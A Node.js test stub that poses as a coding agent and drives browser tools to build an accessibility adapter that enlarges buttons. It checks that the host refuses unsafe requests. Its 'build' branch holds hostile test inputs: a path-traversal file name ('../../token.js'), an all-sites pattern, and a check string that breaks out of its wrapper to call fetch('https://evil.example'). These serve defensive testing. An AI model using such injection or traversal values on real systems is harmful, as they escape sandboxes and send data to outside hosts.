#!/usr/bin/env node
// Stands in for `opencode run --format json` in the host's tests: it reads the
// sandbox config like opencode does, writes an adapter, calls the browser
// tools over MCP like the agent would, and prints opencode-style JSON lines.

import { readFileSync, mkdirSync, writeFileSync } from 'node:fs';

const config = JSON.parse(readFileSync(process.env.OPENCODE_CONFIG, 'utf8'));
const { url, headers } = config.mcp.browser;
const args = process.argv.slice(2);
const session = args.includes('--session') ? args[args.indexOf('--session') + 1] : 'ses_fake123';
const message = args.at(-1);
const out = (o) => process.stdout.write(`${JSON.stringify({ sessionID: session, timestamp: Date.now(), ...o })}\n`);
let n = 0;
async function tool(name, args) {
  const res = await fetch(url, { method: 'POST', headers: { ...headers, 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: ++n, method: 'tools/call', params: { name, arguments: args } }) });
  return (await res.json()).result;
}

out({ type: 'step_start', part: { type: 'step-start' } });
if (/^hang/.test(message)) { setInterval(() => {}, 1000); await new Promise(() => {}); } // runs until stopped
if (/^build/.test(message)) {
  // Two reads in a row: the sidebar folds them into one line.
  for (const id of ['p1', 'p1b']) out({ type: 'tool_use', part: { id, type: 'tool', tool: 'read', state: { status: 'completed', input: { filePath: '/toolkit/.claude/skills/ai4a11y-toolkit/SKILL.md' }, output: 'SECRET FILE TEXT' } } });
  const page = await tool('browser_page', { reason: 'To see which buttons are small.' });
  // Runs on the site the person shared, like the agent would choose.
  const address = /Address: (\S+)/.exec(page.content[0].text)?.[1];
  const runsOn = [address ? `${new URL(address).origin}/*` : 'https://example.com/*'];
  out({ type: 'tool_use', part: { id: 'p2', type: 'tool', tool: 'execute', state: { status: 'completed', input: { code: 'x' }, output: page.content[0].text } } });
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/bigger-buttons.js', 'export const BiggerButtons = { enable() { document.body.dataset.big = "1"; }, disable() { delete document.body.dataset.big; } };\n');
  out({ type: 'tool_use', part: { id: 'p3', type: 'tool', tool: 'write', state: { status: 'completed', input: { filePath: '/work/adapters/bigger-buttons.js', content: 'export const …' } } } });
  const checks = [{ name: 'the page is marked big', code: 'return document.body.dataset.big === "1";' }];
  const ready = (o = {}) => tool('adapter_ready', { file: 'adapters/bigger-buttons.js', id: 'bigger-buttons', name: 'Bigger buttons', about: 'Makes buttons bigger.', runs_on: runsOn, support_areas: ['motor'], ...o });
  const early = await ready();
  const outside = await tool('browser_preview', { file: '../../token.js', name: 'x', runs_on: ['https://example.com/*'], checks });
  const everywhere = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: ['https://*/*'], checks });
  const unchecked = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [] });
  const escape = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks: [{ name: 'x', code: 'return 1; }); fetch("https://evil.example"); (async () => {' }] });
  const preview = await tool('browser_preview', { file: 'adapters/bigger-buttons.js', name: 'Bigger buttons', runs_on: runsOn, checks });
  const done = await ready();
  const verdict = (r) => (r.isError ? 'refused' : 'allowed');
  out({ type: 'text', part: { id: 'p4', type: 'text', text: `Done.\n\`\`\`js\nexport const BiggerButtons = {}\n\`\`\`\nEarly: ${verdict(early)}. Outside: ${verdict(outside)}. Everywhere: ${verdict(everywhere)}. Unchecked: ${verdict(unchecked)}. Escape: ${verdict(escape)}. Preview: ${preview.content[0].text.split('\n')[0]} Changed: ${/enable\(\) made \d+ changes/.test(preview.content[0].text) ? 'yes' : 'no'}. Axe: ${/added no problems axe-core finds/.test(preview.content[0].text) ? 'clean' : /The adapter added \d+ problems/.test(preview.content[0].text) ? 'problems' : 'none'}. Ready: ${done.isError ? 'no' : 'yes'}.` } });
} else if (/^(checkfails|slowcheck|allsites)/.test(message)) {
  // An adapter offered for the background check: one it fails, one that is
  // rebuilt while its check runs, or one for every site.
  const runsOn = [/^allsites/.test(message) ? '*://*/*' : 'https://example.com/*'];
  const checks = [{ name: 'the page is marked big', code: 'return document.body.dataset.big === "1";' }];
  const offer = async (id, body) => {
    mkdirSync('adapters', { recursive: true });
    writeFileSync(`adapters/${id}.js`, `export const A = { enable() { document.body.dataset.big = "1"; /* ${body} */ }, disable() { delete document.body.dataset.big; } };\n`);
    const preview = await tool('browser_preview', { file: `adapters/${id}.js`, name: id, runs_on: runsOn, checks });
    if (preview.isError) return `preview refused: ${preview.content[0].text.slice(0, 60)}`;
    return (await tool('adapter_ready', { file: `adapters/${id}.js`, id, name: id, about: 'For the test.', runs_on: runsOn })).isError ? 'refused' : 'offered';
  };
  let said;
  if (/^checkfails/.test(message)) said = await offer('flaky', 'CHECKFAILS');
  else if (/^allsites/.test(message)) said = await offer('everywhere', 'v1');
  else {
    said = await offer('slow', 'SLOWCHECK');
    await new Promise(r => setTimeout(r, 400));
    said += ', then ' + await offer('slow', 'v2');
  }
  out({ type: 'text', part: { id: 'v1', type: 'text', text: `Verify: ${said}.` } });
} else if (/^previewonly/.test(message)) {
  // Previews an adapter that passes, and ends without adapter_ready.
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/tea-cosy.js', 'export const A = { enable() { document.body.dataset.cosy = "1"; }, disable() { delete document.body.dataset.cosy; } };\n');
  const p = await tool('browser_preview', { file: 'adapters/tea-cosy.js', name: 'Tea cosy', runs_on: ['https://example.com/*'], checks: [{ name: 'cosy', code: 'return document.body.dataset.cosy === "1";' }] });
  out({ type: 'text', part: { id: 'po', type: 'text', text: `Previewed: ${p.content[0].text.split('\n')[0]}` } });
} else if (/^kinds/.test(message)) {
  // The two questions the sidebar lays out itself.
  const asked = await tool('ask_questions', { questions: [
    { kind: 'pages' },
    { kind: 'areas', options: [{ label: 'Motor (Recommended)' }, { label: 'Vision' }] },
  ] });
  out({ type: 'text', part: { id: 'k1', type: 'text', text: `Asked kinds: ${asked.isError ? 'no' : 'yes'}.` } });
} else if (/^questions/.test(message)) {
  const asked = await tool('ask_questions', { questions: [
    { question: 'Which pages?', options: [{ label: 'This page (Recommended)' }, { label: 'The whole site' }] },
    { question: 'Who does it help?', options: [{ label: 'Vision' }, { label: 'Motor' }, { label: 'Other' }], multi_select: true },
  ] });
  const bad = await tool('ask_questions', { questions: [{ question: 'Only one?', options: [{ label: 'Yes' }] }] });
  out({ type: 'text', part: { id: 'p1', type: 'text', text: `Asked: ${asked.isError ? 'no' : 'yes'}. Bad: ${bad.isError ? 'refused' : 'allowed'}.` } });
} else if (/^twin/.test(message)) {
  // Two chats at once: each waits, so the runs overlap, then asks its own question.
  const name = message.split(' ')[1] || 'x';
  await new Promise(r => setTimeout(r, 800));
  const asked = await tool('ask_questions', { questions: [{ question: `From ${name}?`, options: [{ label: 'Yes' }, { label: 'No' }] }] });
  out({ type: 'text', part: { id: 't1', type: 'text', text: `Twin ${name}: ${asked.isError ? 'no' : 'asked'}.` } });
} else if (/^claim/.test(message)) {
  // Two chats writing the same file: the first to preview it keeps it while it runs.
  const wait = Number(message.split(' ')[1]) || 0;
  await new Promise(r => setTimeout(r, wait));
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/shared.js', `export const A = { enable() { document.body.dataset.big = "1"; /* ${wait} */ }, disable() { delete document.body.dataset.big; } };\n`);
  const p = await tool('browser_preview', { file: 'adapters/shared.js', name: 'Shared', runs_on: ['https://example.com/*'], checks: [{ name: 'big', code: 'return document.body.dataset.big === "1";' }] });
  if (!wait) await new Promise(r => setTimeout(r, 1500));
  out({ type: 'text', part: { id: 'c1', type: 'text', text: `Claim ${wait}: ${p.isError ? `refused: ${p.content[0].text}` : 'previewed'}` } });
} else if (/^later/.test(message)) {
  // Asks to see the page a moment later, while the person may be in another chat.
  await new Promise(r => setTimeout(r, 1500));
  const page = await tool('browser_page', { reason: 'To see the page.' });
  out({ type: 'text', part: { id: 'l1', type: 'text', text: `Later: ${page.content[0].text.split('\n')[0]}` } });
} else if (/^sketch/.test(message)) {
  // Writes an adapter and stops without previewing it.
  mkdirSync('adapters', { recursive: true });
  writeFileSync('adapters/sketch.js', 'export const Sketch = { enable() {}, disable() {} };\n');
  out({ type: 'text', part: { id: 'p1', type: 'text', text: 'Here is a sketch.' } });
} else {
  out({ type: 'text', part: { id: 'p1', type: 'text', text: `You said: ${message}` } });
}
out({ type: 'step_finish', part: { type: 'step-finish' } });
